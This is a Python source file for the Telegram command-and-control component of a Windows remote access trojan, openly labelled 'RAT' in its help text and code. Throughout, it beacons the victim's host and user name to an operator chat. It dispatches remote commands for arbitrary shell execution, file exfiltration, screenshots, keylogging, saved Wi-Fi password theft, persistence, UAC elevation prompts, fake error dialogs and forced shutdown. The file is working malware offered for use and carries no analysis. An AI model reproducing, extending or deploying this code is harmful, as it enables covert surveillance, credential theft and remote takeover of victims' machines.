import asyncio
import io
import json
import os
import socket
import subprocess
import tempfile
import threading
import time

import telegram

import cmds


HELP_TEXT = """\U0001f5a5 RAT commands

\U0001f464 IDENTITY
  /whoami               identity + elevation state
  /admincheck           admin/medium integrity
  /sysinfo              host + hardware summary
  /datetime             date, time, uptime
  /idletime             idle duration + lock state
  /procs                top processes by RAM
  /installed            installed software inventory
  /devices              present PnP devices

\U0001f5c2 PROCESS
  /kill <pid>           terminate
  /suspend <pid>        freeze
  /resume <pid>         thaw

\U0001f4c1 FILES
  /cd <path>            change working directory
  /currentdir           show working directory
  /dir [path]           list directory (alias /ls)
  /mkdir <path>         create folder
  /copy <src> <dst>     copy file or folder
  /move <src> <dst>     move file or folder
  /rename <old> <new>   rename
  /delete <path>        delete file or folder
  /download <file>      read file to this host
  /search <path> <pat>  recursive filename search
  /fileinfo <path>      size / mtimes / permissions
  /hash <path> [algo]   file checksum, sha256 default
  /dirsize [path]       recursive folder size
  /drives               enumerate disk volumes
  /recent               files touched in last 7 days

\U0001f310 NETWORK
  /ipconfig             adapters, addresses, default route
  /netstat              live connections + owning process
  /wifilist             nearby wireless networks
  /env                  environment variables
  /geolocate            public IP geolocation

\U0001f5c2 WINDOWS
  /reg <hive> <path>    read registry values (HKLM/HKCU/HKCR)
  /services             installed service names
  /startup              autorun entries
  /windows              visible top-level windows

\U0001f4f8 CAPTURE
  /screenshot           full screen PNG

\U0001f3ad INTERACTION
  /message <text>       pop a message box on the host
  /fake <text>          error-styled dialog, title via /fake <title> | <text>
  /blocksite <site>     map a domain to 0.0.0.0 in the hosts file (admin)
  /unblocksite <site>   drop those entries again
  /uac [cmd]           prompt for consent and relaunch elevated, or run one
                       elevated command (cmd.exe /c <cmd>)
  /voice <text>         speak text aloud via SAPI
  /write <text>         type text into the focused window
  /website <url>        open a URL in the default browser
  /volumeup             volume up (x3)
  /volumedown           volume down (x3)
  /mute                 toggle mute
  /wallpaper            reply to an image to set it as wallpaper
  /audio                reply to an audio file to play it

\U0001f50e PERSIST
  /persist              install autorun entry
  /unpersist            remove autorun entry

\u26a1 CONTROL
  /cmd <shell>          run any shell command
  /shutdown             power off in 5s
  /restart              reboot in 5s
  /help                 this message
"""


def _split_args(payload):
    """Split a command payload into args, honouring quoted paths."""
    import shlex
    try:
        return shlex.split(payload, posix=False)
    except ValueError:
        return payload.split()


def _esc(s):
    return (str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))


def _pre(lines):
    """Monospace block so columns line up in Telegram."""
    return "<pre>" + _esc("\n".join(lines)) + "</pre>"


def _head(title):
    """Section header in the same style as /help."""
    return [title, ""]


def _kv(pairs, keyw=14):
    """Aligned two-column key/value rows."""
    rows = []
    for k, v in pairs:
        v = "-" if v is None or v == "" else v
        rows.append(f"  {str(k):<{keyw}} {v}")
    return rows


def _table(headers, rows, limit=30):
    """Aligned columns, no rules - matches /help spacing."""
    if not rows:
        return ["  (none)"]
    cols = len(headers)
    widths = [len(h) for h in headers]
    norm = []
    for r in rows[:limit]:
        cells = [str(c) for c in r[:cols]]
        cells += [""] * (cols - len(cells))
        norm.append(cells)
        for i, c in enumerate(cells):
            widths[i] = max(widths[i], min(len(c), 46))
    out = ["  " + "  ".join(f"{h:<{widths[i]}}" for i, h in enumerate(headers)).rstrip()]
    for cells in norm:
        out.append("  " + "  ".join(
            f"{c[:46]:<{widths[i]}}" for i, c in enumerate(cells)
        ).rstrip())
    if len(rows) > limit:
        out.append(f"  ... +{len(rows) - limit} more")
    return out


def _note(msg):
    return ["", f"  {msg}"]


def _human_or_none(v):
    if v is None:
        return "  (no detail)"
    if isinstance(v, dict):
        return "\n".join(f"  {k:<12} {val}" for k, val in v.items())
    return f"  {v}"


def _shorten(v, n=46):
    s = str(v)
    return s if len(s) <= n else s[: n - 3] + "..."


def _render(command, result):
    """Per-command layout, styled to match /help."""
    if not isinstance(result, dict):
        return _pre([str(result)])

    if result.get("status") == "error":
        return _pre([f"\u274c /{command}", ""]
                    + [f"  {result.get('message', 'error')}"])

    d = result.get("data")
    out = result.get("output")

    if command in ("help", "start"):
        return _pre(HELP_TEXT.splitlines())

    if command == "whoami":
        d = d or {}
        body = _head("\U0001f464 IDENTITY")
        body += _kv([
            ("User", d.get("user")),
            ("Machine", d.get("machine")),
            ("Admin", "yes" if d.get("admin") else "no"),
            ("Integrity", d.get("integrity")),
            ("Packaged", "exe" if d.get("frozen") else "python script"),
            ("Image", _shorten(d.get("exe"), 42)),
        ], keyw=12)
        if not d.get("admin"):
            body += _note("not elevated \u2014 some reads will be limited")

    elif command in ("admincheck",):
        d = d or {}
        body = _head("\U0001f511 ELEVATION")
        body += _kv([
            ("User", d.get("user")),
            ("Admin", "yes" if d.get("admin") else "no"),
            ("Integrity", d.get("privileges")),
            ("SID", d.get("sid")),
        ], keyw=12)

    elif command == "sysinfo":
        d = d or {}
        body = _head("\U0001f5a5 SYSTEM")
        body += _kv([
            ("Host", d.get("hostname")),
            ("User", d.get("user")),
            ("OS", d.get("os")),
            ("Arch", d.get("arch")),
            ("CPU", f"{d.get('cpu_cores')} cores \u00b7 {d.get('cpu_load')}"),
            ("RAM", f"{d.get('ram_used')} / {d.get('ram_total')}"),
            ("Booted", d.get("boot_time")),
        ], keyw=12)

    elif command == "datetime":
        d = d or {}
        body = _head("\U0001f552 DATE & TIME")
        body += _kv([
            ("Local", d.get("local")),
            ("UTC", d.get("utc")),
            ("Zone", d.get("tz")),
            ("Uptime", d.get("uptime")),
        ], keyw=12)

    elif command == "idletime":
        d = d or {}
        body = _head("\U0001f634 IDLE")
        body += _kv([
            ("Idle for", d.get("idle_human")),
            ("Seconds", d.get("idle_seconds")),
            ("Session", d.get("session")),
        ], keyw=12)

    elif command == "procs":
        rows = [[p.get("pid"), f"{p.get('ram') or 0:.1f}%", p.get("name", "")[:40]]
                for p in (d or [])]
        body = _head("\U0001f5c2 PROCESSES")
        body += _table(["PID", "RAM", "NAME"], rows)

    elif command == "kill" or command == "suspend" or command == "resume":
        verb = {"kill": "KILLED", "suspend": "SUSPENDED", "resume": "RESUMED"}[command]
        body = _head(f"\u2705 {verb}")
        body += [f"  {result.get('message', '')}"]

    elif command == "installed":
        rows = [[i.get("name"), i.get("version"), _shorten(i.get("publisher"), 26)]
                for i in (d or [])]
        body = _head("\U0001f4e6 INSTALLED SOFTWARE")
        body += _table(["NAME", "VERSION", "PUBLISHER"], rows)

    elif command == "devices":
        rows = [[i.get("class"), _shorten(i.get("name"), 30), i.get("status")]
                for i in (d or [])]
        body = _head("\U0001f50c DEVICES")
        body += _table(["CLASS", "NAME", "STATUS"], rows)

    elif command == "ipconfig":
        rows = [[i.get("interface"), i.get("state"), i.get("kind"),
                 i.get("addr"), i.get("netmask")] for i in (d or [])]
        body = _head("\U0001f310 IP CONFIG")
        body += _table(["INTERFACE", "UP", "KIND", "ADDRESS", "MASK"], rows)
        if result.get("default_route"):
            body += _note(f"default: {result['default_route']}")

    elif command == "netstat":
        rows = [[i.get("proto"), i.get("local"), i.get("remote"),
                 i.get("state"), i.get("pid"), _shorten(i.get("process"), 16)]
                for i in (d or [])]
        body = _head("\U0001f5a5 CONNECTIONS")
        body += _table(["PROTO", "LOCAL", "REMOTE", "STATE", "PID", "PROCESS"], rows)

    elif command == "net":
        rows = []
        for i in (d or []):
            if i.get("type") == "conn":
                rows.append(["conn", i.get("local"), i.get("remote"), i.get("pid")])
            else:
                rows.append([i.get("type"), i.get("interface"), i.get("addr"), ""])
        body = _head("\U0001f310 NETWORK")
        body += _table(["KIND", "A", "B", "PID"], rows)

    elif command == "wifilist":
        rows = [[i.get("ssid"), i.get("signal"), i.get("channel"), i.get("auth")]
                for i in (d or [])]
        body = _head("\U0001f6f1 NEARBY WI-FI")
        body += _table(["SSID", "SIGNAL", "CH", "AUTH"], rows)

    elif command == "wifi":
        rows = [[k, (v or "")[:38]] for k, v in (d or {}).items()]
        body = _head("\U0001f6f1 SAVED WI-FI")
        body += _table(["SSID", "KEY"], rows)
        if result.get("elevated") is False:
            body += _note("not elevated \u2014 some keys hidden")

    elif command == "env":
        rows = [[i.get("name"), _shorten(i.get("value"), 42)] for i in (d or [])]
        body = _head("\u2133\ufe0f ENVIRONMENT")
        body += _table(["VAR", "VALUE"], rows)

    elif command == "geolocate":
        d = d or {}
        body = _head("\U0001f4cd GEOLOCATION")
        body += _kv([
            ("IP", d.get("ip")), ("City", d.get("city")),
            ("Region", d.get("region")), ("Country", d.get("country")),
            ("ISP", d.get("org")), ("Timezone", d.get("timezone")),
            ("Lat/Lon", d.get("lat/lon")),
        ], keyw=12)

    elif command in ("ls", "dir"):
        rows = [[i.get("name"), "dir" if i.get("is_dir") else _size(i.get("size")),
                 _ago(i.get("mtime"))] for i in (d or [])]
        body = _head("\U0001f4c1 DIRECTORY")
        body += _table(["NAME", "SIZE", "MODIFIED"], rows)

    elif command == "search":
        rows = [[_shorten(i.get("path"), 38), _size(i.get("size"))] for i in (d or [])]
        body = _head("\U0001f50d SEARCH")
        body += _table(["PATH", "SIZE"], rows)

    elif command == "fileinfo":
        d = d or {}
        body = _head("\U0001f4ce FILE")
        body += _kv([
            ("Name", d.get("name")), ("Size", _size(d.get("size"))),
            ("Created", _when(d.get("created"))),
            ("Modified", _when(d.get("modified"))),
            ("Accessed", _when(d.get("accessed"))),
            ("Perms", d.get("permissions")),
        ], keyw=12)

    elif command == "hash":
        d = d or {}
        body = _head("# CHECKSUM")
        body += _kv([
            ("File", _shorten(d.get("path"), 38)),
            ("Algo", d.get("algorithm")),
            ("Hash", d.get("hash")),
        ], keyw=8)

    elif command == "drives":
        body = _head("\U0001f4be VOLUMES")
        body += [f"  {v}" for v in (d or [])] or ["  (none)"]

    elif command in ("message", "fake", "voice", "write", "website",
                     "volumeup", "volumedown", "mute", "wallpaper", "audio"):
        labels = {
            "message": "\U0001f4ac MESSAGE", "voice": "\U0001f3a4 VOICE",
            "write": "✈ KEYSTROKES", "website": "\U0001f310 WEBSITE",
            "volumeup": "\U0001f50a VOLUME UP", "volumedown": "\U0001f509 VOLUME DOWN",
            "mute": "\U0001f507 MUTE", "wallpaper": "\U0001f5bc WALLPAPER",
            "audio": "\U0001f3b5 AUDIO", "fake": "⚠ DIALOG",
        }
        body = _head(f"\u2705 {labels.get(command, command.upper())}")
        body += [f"  {result.get('output') or result.get('message') or 'done'}"]

    elif command == "services":
        body = _head("\u2699 SERVICES")
        body += [f"  {_shorten(s, 44)}" for s in (d or [])[:30]]

    elif command == "startup":
        rows = [[i.get("name"), i.get("source"), _shorten(i.get("command"), 28)]
                for i in (d or [])]
        body = _head("\u2699 AUTORUN")
        body += _table(["NAME", "SOURCE", "COMMAND"], rows)

    elif command == "windows":
        rows = [[i.get("pid"), _shorten(i.get("title"), 36)] for i in (d or [])]
        body = _head("\U0001f5ad VISIBLE WINDOWS")
        body += _table(["PID", "TITLE"], rows)

    elif command == "reg":
        rows = [[v.get("name"), _shorten(v.get("value"), 34), v.get("type")]
                for v in (d or [])]
        body = _head("\U0001f5c2 REGISTRY")
        body += _table(["NAME", "VALUE", "TYPE"], rows)

    elif command == "keylogger_dump":
        text = (d or "").strip()
        body = _head("\u2328 KEYLOG")
        body += ["  " + _shorten(text, 1200)] if text else ["  (nothing captured)"]

    elif command in ("cd", "currentdir", "mkdir", "copy", "move", "rename", "delete"):
        icons = {
            "cd": "\U0001f4c1", "currentdir": "\U0001f4c1", "mkdir": "\U0001f4c1",
            "copy": "\U0001f4cb", "move": "\U0001f4e6",
            "rename": "\u270f\ufe0f", "delete": "\U0001f5d1\ufe0f",
        }
        body = _head(f"{icons.get(command, '\u2139\ufe0f')} {command.upper()}")
        body += [f"  {result.get('message')}"] if result.get("message") else []
        body += _kv(list(d.items()), keyw=10) if isinstance(d, dict) else \
            [_human_or_none(d)]

    elif command == "keylogger_start" or command == "keylogger_stop":
        body = _head("\u2328 KEYLOGGER")
        body += [f"  {result.get('output', '')}"]

    elif command in ("blocksite", "unblocksite"):
        icons = {"blocksite": "\U0001f6ab", "unblocksite": "\u2705"}
        body = _head(f"{icons.get(command, '\u2139\ufe0f')} {command.upper()}")
        body += [f"  {result.get('output') or result.get('message')}"]

    elif command == "uac":
        body = _head("\U0001f510 ELEVATION")
        body += [f"  {result.get('output') or result.get('message')}"]
        if result.get("status") != "error":
            body += ["  (UAC prompt shown on the host - user must accept)"]

    elif command == "download":
        body = _head("\U0001f4e6 DOWNLOAD")
        body += _kv([
            ("Name", result.get("filename")),
            ("Size", _size(result.get("size"))),
        ], keyw=8)

    elif command == "screenshot":
        return _pre(["\U0001f4f8 SCREENSHOT", "", "  (see attached photo)"])

    elif command in ("persist", "unpersist"):
        body = _head("\U0001f50e PERSISTENCE")
        body += [f"  {result.get('message') or _shorten(d, 40)}"]

    else:
        body = _head(f"\u25b6 {command.upper()}")
        if out:
            body += ["  " + ln for ln in _shorten(out, 3200).splitlines()]
        if result.get("error"):
            body += _note("stderr:")
            body += ["  " + ln for ln in _shorten(result["error"], 400).splitlines()]
        if isinstance(d, list) and d:
            rows = [[i.get("name") or i.get("pid") or i.get("ssid") or "?",
                     _shorten(", ".join(f"{k}={v}" for k, v in i.items()
                                        if k not in ("name", "pid", "ssid")), 32)]
                    for i in d if isinstance(i, dict)]
            body += _table(["NAME", "DETAIL"], rows)
        elif isinstance(d, dict) and d:
            body += _kv(list(d.items())[:20], keyw=12)
        elif not out:
            body += ["  (no output)"]

    return _pre(body)

def _size(n):
    if not n:
        return "-"
    n = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024:
            return f"{n:.0f}{unit}" if unit == "B" else f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}PB"


def _when(ts):
    """Absolute timestamp, human readable."""
    if not ts:
        return "-"
    try:
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(float(ts)))
    except Exception:
        return str(ts)


def _ago(ts):
    if not ts:
        return "-"
    try:
        d = time.time() - float(ts)
        if d < 60:
            return "just now"
        if d < 3600:
            return f"{int(d // 60)}m ago"
        if d < 86400:
            return f"{int(d // 3600)}h ago"
        return f"{int(d // 86400)}d ago"
    except Exception:
        return "-"


def _split(text, size=3900):
    """Split long output across multiple messages."""
    out, buf = [], ""
    for line in text.splitlines():
        if len(buf) + len(line) + 1 > size:
            if buf:
                out.append(buf)
            buf = ""
        if len(line) > size:
            for i in range(0, len(line), size):
                out.append(line[i:i + size])
        else:
            buf = f"{buf}\n{line}" if buf else line
    if buf:
        out.append(buf)
    return out or [""]


class TelegramBridge:
    """Async Telegram C2 for python-telegram-bot v20+ (coroutine API)."""

    def __init__(self, token, chat_id, rat):
        self.token = token
        self.bot = None
        self.chat_id = chat_id
        self.rat = rat
        self.loop = None
        self.last_update_id = None
        self.running = False
        self.authed = False
        self.last_message = None
        self.configured = not str(token).startswith("YOUR_")

    # ---------------- lifecycle ----------------
    def start(self):
        if not self.configured:
            print("[!] TELEGRAM_BOT_TOKEN is a placeholder - headless, C2 disabled")
            print("[!] set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in rat.py")
            return

        ready = threading.Event()
        self.result = {}

        threading.Thread(target=self._run, args=(ready,), daemon=True).start()
        ready.wait(timeout=30)

        if not self.authed:
            print("[!] Telegram auth failed - headless, C2 disabled")
            return
        print("[+] Telegram C2 connected")

    def _run(self, ready):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self._main(ready))
        except Exception as e:
            print(f"[!] event loop stopped: {type(e).__name__}: {e}")
        finally:
            try:
                self.loop.close()
            except Exception:
                pass

    async def _main(self, ready):
        try:
            self.bot = telegram.Bot(token=self.token)
            me = await self.bot.get_me()
            self.authed = True
            print(f"[+] Telegram auth OK as @{me.username}")
        except Exception as e:
            print(f"[!] Telegram auth failed: {type(e).__name__}: {e}")
            ready.set()
            return

        ready.set()

        # greeting is best-effort; must never take down the poll loop
        try:
            await self._send(
                f"\U0001f5a5 RAT online\n"
                f"Host: `{socket.gethostname()}`\n"
                f"User: `{os.environ.get('USERNAME') or os.environ.get('USER') or '?'}`\n\n"
                f"Send /help for commands."
            )
        except Exception as e:
            print(f"[!] greeting failed (non-fatal): {type(e).__name__}: {e}")

        self.running = True
        try:
            await self._poll()
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[!] poll loop crashed: {type(e).__name__}: {e}")

    async def _send(self, text, html=False):
        """Plain-text send, chunked to stay under the 4096 char limit."""
        if self.bot is None:
            return
        mode = "HTML" if html else None
        for chunk in _split(text, 3600 if html else 3900):
            try:
                await self.bot.send_message(
                    chat_id=self.chat_id,
                    text=chunk,
                    parse_mode=mode,
                    disable_web_page_preview=True,
                )
            except Exception as e:
                # malformed markup -> retry once as plain text
                if html:
                    for plain in _split(chunk.replace("<pre>", "").replace("</pre>", "")):
                        try:
                            await self.bot.send_message(chat_id=self.chat_id, text=plain)
                        except Exception as e2:
                            print(f"[!] TG send error: {type(e2).__name__}: {e2}")
                    return
                print(f"[!] TG send error: {type(e).__name__}: {e}")
                return

    async def _send_photo(self, png_bytes, caption):
        """Upload raw PNG bytes as a real Telegram photo."""
        if self.bot is None:
            return
        try:
            await self.bot.send_photo(
                chat_id=self.chat_id,
                photo=io.BytesIO(png_bytes),
                caption=caption[:1024],
            )
        except Exception as e:
            print(f"[!] TG photo error: {type(e).__name__}: {e}")
            await self._send(f"photo upload failed: {type(e).__name__}: {e}")

    async def _send_document(self, data, filename, caption):
        """Upload raw bytes as a real Telegram document."""
        if self.bot is None:
            return
        try:
            await self.bot.send_document(
                chat_id=self.chat_id,
                document=io.BytesIO(data),
                filename=filename or "file.bin",
                caption=(caption or "")[:1024],
            )
        except Exception as e:
            print(f"[!] TG document error: {type(e).__name__}: {e}")
            await self._send(f"upload failed: {type(e).__name__}: {e}")

    async def _send_result(self, command, result):
        """Dispatch a command result: photo first, then formatted text."""
        if isinstance(result, dict) and result.get("_photo"):
            cap = result.get("_caption", "")
            await self._send_photo(result["_photo"], f"/{command} \u00b7 {cap}".strip(" \u00b7"))
            remainder = {k: v for k, v in result.items() if not k.startswith("_")}
            if remainder.get("status") == "error":
                await self._send(_render(command, remainder), html=True)
            return

        if isinstance(result, dict) and result.get("_document"):
            name = result.get("filename") or "file.bin"
            size = result.get("size") or len(result["_document"])
            await self._send_document(
                result["_document"],
                name,
                f"/{command} \u00b7 {name} ({size // 1024} KB)",
            )
            return

        await self._send(_render(command, result), html=True)

    def send(self, text):
        """Thread-safe send from non-async callers."""
        if self.loop is None or not self.authed:
            return
        try:
            asyncio.run_coroutine_threadsafe(self._send(text), self.loop)
        except Exception as e:
            print(f"[!] TG dispatch error: {e}")

    def stop(self):
        self.running = False
        if self.loop:
            self.loop.call_soon_threadsafe(self.loop.stop)

    # ---------------- poll loop ----------------
    async def _poll(self):
        idle = 0
        while self.running:
            try:
                updates = await self.bot.get_updates(
                    offset=self.last_update_id,
                    timeout=20,
                    allowed_updates=["message"],
                )
                idle = 0
            except asyncio.CancelledError:
                raise
            except Exception as e:
                idle += 1
                wait = min(60, 5 * idle)
                print(f"[!] TG poll error (retry in {wait}s): {type(e).__name__}: {e}")
                await asyncio.sleep(wait)
                continue

            for upd in updates:
                self.last_update_id = upd.update_id + 1
                msg = upd.effective_message
                if not msg or not msg.text:
                    continue
                if str(msg.chat.id) != str(self.chat_id):
                    continue

                text = msg.text.strip()
                self.last_message = msg
                if not text.startswith("/"):
                    continue

                head, _, rest = text.partition(" ")
                command = head[1:].split("@")[0].lower()
                payload = rest.strip()

                print(f"[*] cmd: /{command} {payload}".rstrip(), flush=True)
                try:
                    result = self._dispatch(command, payload)
                except Exception as e:
                    result = {"status": "error", "message": f"{type(e).__name__}: {e}"}

                await self._send_result(command, result)

            # drain getUpdates backlog so Telegram does not 409 on next poll
            await asyncio.sleep(0.05)

    # ---------------- attachment-backed commands ----------------
    def _use_attachment(self, kind, action, label):
        """Download the photo/document this command was sent as a reply to."""
        msg = self.last_message
        if msg is None or msg.reply_to_message is None:
            return {"status": "error",
                    "message": f"reply to {label} and send /{kind}"}

        src = msg.reply_to_message
        doc = src.document
        if not doc and src.photo:
            doc = src.photo[-1]
        if not doc:
            return {"status": "error", "message": "no attachment on the replied-to message"}

        try:
            size = getattr(doc, "file_size", 0) or 0
            if size > 20 * 1024 * 1024:
                return {"status": "error", "message": f"attachment too large ({size // 1048576}MB)"}
            f = self.bot.get_file(doc.file_id)
            dest = os.path.join(
                tempfile.gettempdir(),
                f"rat_{kind}_{int(time.time())}_{os.path.basename(getattr(doc, 'file_path', '') or 'att')}",
            )
            f.download_to_drive(custom_path=dest)
            return action(dest)
        except Exception as e:
            return {"status": "error", "message": f"download failed: {type(e).__name__}: {e}"}

    # ---------------- command table ----------------
    def _dispatch(self, command, payload):
        rat = self.rat
        m = rat.modules

        if command in ("help", "start"):
            return {"status": "success", "help": True, "output": HELP_TEXT}

        if command == "whoami":
            return rat.whoami()

        # ---- system inventory ----
        if command == "datetime":
            return rat.get_datetime()
        if command == "admincheck":
            return rat.check_admin()
        if command == "idletime":
            return rat.get_idletime()
        if command == "installed":
            return rat.get_installed()
        if command == "devices":
            return rat.get_devices()

        # ---- network info ----
        if command == "ipconfig":
            return rat.get_ipconfig()
        if command == "netstat":
            return rat.get_netstat()
        if command == "env":
            return rat.get_env()
        if command == "wifilist":
            return rat.get_wifi_networks()
        if command == "geolocate":
            return rat.geolocate()

        # ---- working directory + file ops ----
        fs = m.fs
        if command == "cd":
            if not payload:
                return {"status": "error", "message": "usage: /cd <path>"}
            return fs.cd(payload)
        if command == "currentdir":
            return fs.currentdir()
        if command == "copy":
            args = _split_args(payload)
            if len(args) < 2:
                return {"status": "error", "message": "usage: /copy <src> <dst>"}
            return fs.copy(args[0], args[1])
        if command == "move":
            args = _split_args(payload)
            if len(args) < 2:
                return {"status": "error", "message": "usage: /move <src> <dst>"}
            return fs.move(args[0], args[1])
        if command == "rename":
            args = _split_args(payload)
            if len(args) < 2:
                return {"status": "error", "message": "usage: /rename <old> <new>"}
            return fs.rename(args[0], args[1])
        if command == "mkdir":
            if not payload:
                return {"status": "error", "message": "usage: /mkdir <path>"}
            return fs.mkdir(payload)
        if command == "delete":
            if not payload:
                return {"status": "error", "message": "usage: /delete <path>"}
            return fs.delete(payload)

        if command == "cmd":
            return rat.cmd_executor(payload)

        # ---- desktop interaction ----
        if command == "message":
            if not payload:
                return {"status": "error", "message": "usage: /message <text>"}
            return cmds.show_message(payload, "Notice")
        if command == "fake":
            return cmds.fake_error(payload)
        if command == "blocksite":
            if not payload:
                return {"status": "error", "message": "usage: /blocksite <site>"}
            return cmds.block_site(payload)
        if command == "unblocksite":
            if not payload:
                return {"status": "error", "message": "usage: /unblocksite <site>"}
            return cmds.unblock_site(payload)
        if command == "uac":
            return rat.request_elevation(payload)
        if command == "voice":
            return cmds.speak(payload)
        if command == "write":
            return cmds.type_text(payload)
        if command == "website":
            if not payload:
                return {"status": "error", "message": "usage: /website <url>"}
            return cmds.open_url(payload)
        if command in ("volumeup", "volumedown", "mute"):
            return cmds.media_key(command)
        if command == "wallpaper":
            return self._use_attachment(command, cmds.set_wallpaper, "an image")
        if command == "audio":
            return self._use_attachment(command, cmds.play_audio, "an audio file")

        if command == "sysinfo":
            return rat.get_system_info()
        if command == "procs":
            return rat.get_process_list()

        if command == "kill":
            return rat.kill_process(payload)
        if command == "suspend":
            return rat.suspend_process(payload)
        if command == "resume":
            return rat.resume_process(payload)

        if command == "ls":
            return m.fm.list_files(payload or m.fs.cwd)
        if command == "dir":
            return m.fm.list_files(payload or m.fs.cwd)
        if command == "search":
            parts = payload.split(None, 1)
            raw = parts[0] if parts else m.fs.cwd
            pattern = parts[1] if len(parts) > 1 else ""
            return m.fm.search_files(m.fs.resolve(raw), pattern)
        if command == "fileinfo":
            return m.fm.get_file_details(m.fs.resolve(payload))
        if command == "hash":
            parts = payload.split(None, 1)
            algo = parts[1] if len(parts) > 1 else "sha256"
            return m.fm.hash_file(m.fs.resolve(parts[0]), algo)
        if command == "dirsize":
            return m.fm.get_directory_size(m.fs.resolve(payload or m.fs.cwd))
        if command == "download":
            if not payload:
                return {"status": "error", "message": "usage: /download <path>"}
            return m.fm.download_file(m.fs.resolve(payload))
        if command == "drives":
            return m.fm.list_drives()
        if command == "recent":
            return m.fm.get_recent_files(m.fs.cwd, 7)

        if command == "screenshot":
            return m.take_screenshot()

        if command == "keylogger_start":
            m.keylogger.start()
            return {"status": "success", "output": "keylogger running"}
        if command == "keylogger_stop":
            m.keylogger.stop()
            return {"status": "success", "output": "keylogger stopped"}
        if command == "keylogger_dump":
            return m.keylogger.dump()

        if command == "net":
            return rat.get_network_info()
        if command == "wifi":
            return rat.get_wifi_passwords()

        if command == "reg":
            parts = payload.split(None, 1)
            hive = parts[0] if parts else "HKLM"
            path = parts[1] if len(parts) > 1 else r"SOFTWARE\Microsoft\Windows\CurrentVersion"
            return rat.read_registry_key(path, hive)
        if command == "services":
            return rat.list_services()
        if command == "startup":
            return rat.get_startup_items()
        if command == "windows":
            return rat.get_window_list()

        if command == "persist":
            return rat.create_persistence()
        if command == "unpersist":
            return rat.remove_persistence()

        if command == "shutdown":
            _run_shutdown("/s /t 5")
            return {"status": "success", "output": "shutdown in 5s"}
        if command == "restart":
            _run_shutdown("/r /t 5")
            return {"status": "success", "output": "restart in 5s"}

        return {"status": "error", "message": f"unknown command: /{command} - send /help"}


def _run_shutdown(args):
    subprocess.Popen(
        f"shutdown {args}",
        shell=True,
        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
    )